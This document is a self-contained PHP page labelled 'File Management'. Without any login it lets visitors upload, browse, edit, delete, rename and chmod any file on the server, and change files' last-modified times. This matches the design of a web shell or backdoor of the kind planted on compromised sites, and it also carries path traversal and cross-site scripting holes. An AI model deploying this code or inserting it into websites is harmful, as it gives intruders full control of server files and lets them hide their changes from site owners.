<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1.0'>
<title>File Management</title>
<style>
  <link rel="stylesheet" href="styles.css">
</style>
</head>
<body>

<div class='container'>    
    <form action='' method='post' enctype='multipart/form-data'>
        <label for='fileToUpload'>Select file to upload:</label><br>
        <input type='file' name='fileToUpload' id='fileToUpload'><br>
        <input type='submit' value='Upload File' name='submit'>
    </form>
    <?php
    function formatSizeUnits($bytes) {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }
    function listFiles($directory) {
        $files = scandir($directory);
        echo "<ul>";
        foreach ($files as $file) {
            $fullPath = $directory . '/' . $file;
            if (is_dir($fullPath)) {
                if ($file != "." && $file != "..") {
                    echo "<li><a href='?dir=$fullPath'>$file</a> (Directory)</li>";
                }
            } else {
                if ($file != "." && $file != "..") {
                    $lastModified = date("Y-m-d H:i:s", filemtime($fullPath));
                    echo "<li><a href='?file=$fullPath'>$file</a> (" . formatSizeUnits(filesize($fullPath)) . ") : $lastModified - ";
                    echo "<a href='?action=edit&file=$fullPath'>Edit</a> | ";
                    echo "<a href='?action=delete&file=$fullPath'>Delete</a> | ";
                    echo "<a href='?action=rename&file=$fullPath'>Rename</a> | ";
                    echo "<a href='?action=permissions&file=$fullPath'>Change Permissions</a> | ";
                    echo "<a href='?action=changeLastModified&file=$fullPath'>Modified</a></li>";
                }
            }
        }
        echo "</ul>";
    }

    $currentDirectory = isset($_GET['dir']) ? $_GET['dir'] : '.';
    echo "<h2>Files in the current directory: $currentDirectory</h2>";
    listFiles($currentDirectory);

    if(isset($_POST["submit"])) {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]))) {
            echo "The file ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])). " has been uploaded.";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }

    if(isset($_GET['action']) && isset($_GET['file'])) {
        $action = $_GET['action'];
        $file = $_GET['file'];
        
        if($action == "edit") {
            echo "<h2>Edit file: $file</h2>";
            if(file_exists($file)) {
                echo "<form action='?action=save&file=$file' method='post'>";
                echo "<textarea name='fileContent' rows='10' cols='50'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br>";
                echo "<input type='submit' value='Save Changes'>";
                echo "</form>";
            } else {
                echo "File not found.";
            }
        } elseif($action == "delete") {
            if(file_exists($file)) {
                if(is_dir($file)) {
                    // Delete directory and its contents recursively
                    deleteDirectory($file);
                    echo "Directory '$file' has been deleted.";
                } else {
                    // Delete file
                    unlink($file);
                    echo "File '$file' has been deleted.";
                }
            } else {
                echo "File or directory not found.";
            }
        } elseif($action == "rename") {
            if(file_exists($file)) {
                echo "<h2>Rename file: $file</h2>";
                echo "<form action='?action=saveRename&file=$file' method='post'>";
                echo "<input type='text' name='newFileName' value='$file'><br>";
                echo "<input type='submit' value='Rename'>";
                echo "</form>";
            } else {
                echo "File not found.";
            }
        } elseif($action == "saveRename") {
            $newFileName = $_POST['newFileName'];
            if(rename($file, $newFileName)) {
                echo "File has been renamed to '$newFileName'.";
            } else {
                echo "Error renaming the file.";
            }
        } elseif($action == "save") {
            $content = $_POST['fileContent'];
            if(file_put_contents($file, $content)) {
                echo "Changes saved successfully.";
            } else {
                echo "Error saving changes.";
            }
        } elseif($action == "permissions") {
            echo "<h2>Change permissions for file: $file</h2>";
            if(file_exists($file)) {
                echo "<form action='?action=savePermissions&file=$file' method='post'>";
                echo "New Permissions: <input type='text' name='newPermissions' value='" . substr(sprintf('%o', fileperms($file)), -4) . "'><br>";
                echo "<input type='submit' value='Change Permissions'>";
                echo "</form>";
            } else {
                echo "File not found.";
            }
        } elseif($action == "savePermissions") {
            $newPermissions = $_POST['newPermissions'];
            if(chmod($file, octdec($newPermissions))) {
                echo "Permissions changed successfully.";
            } else {
                echo "Error changing permissions.";
            }
        } elseif($action == "changeLastModified") {
            if(file_exists($file)) {
                echo "<h2>Change last modified time for file: $file</h2>";
                echo "<form action='?action=saveLastModified&file=$file' method='post'>";
                echo "New Last Modified Time: <input type='text' name='newLastModified' placeholder='YYYY-MM-DD HH:MM:SS'><br>";
                echo "<input type='submit' value='Change Last Modified Time'>";
                echo "</form>";
            } else {
                echo "File not found.";
            }
        } elseif($action == "saveLastModified") {
            $newLastModified = strtotime($_POST['newLastModified']);
            if($newLastModified !== false) {
                if(touch($file, $newLastModified)) {
                    echo "Last modified time changed successfully.";
                } else {
                    echo "Error changing last modified time.";
                }
            } else {
                echo "Invalid timestamp format. Please provide a valid date/time (YYYY-MM-DD HH:MM:SS).";
            }
        }
    }

    function deleteDirectory($dir) {
        if (is_dir($dir)) {
            $objects = scandir($dir);
            foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                    if (is_dir($dir . "/" . $object)) {
                        deleteDirectory($dir . "/" . $object);
                    } else {
                        unlink($dir . "/" . $object);
                    }
                }
            }
            rmdir($dir);
        }
    }
    ?>
</div>
</body>
</html>
